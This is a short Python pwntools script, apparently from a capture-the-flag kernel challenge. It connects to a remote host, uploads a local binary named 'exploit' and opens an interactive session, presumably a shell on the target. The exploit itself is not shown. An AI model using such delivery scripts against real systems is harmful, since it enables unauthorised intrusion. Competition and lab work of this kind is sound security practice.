from pwn import *
from pwnc.kernel.util import remote_upload

# p = remote("localhost", 5000)
p = remote("smiley.cat", "37621")
remote_upload(p, open("exploit", "rb").read())
p.interactive()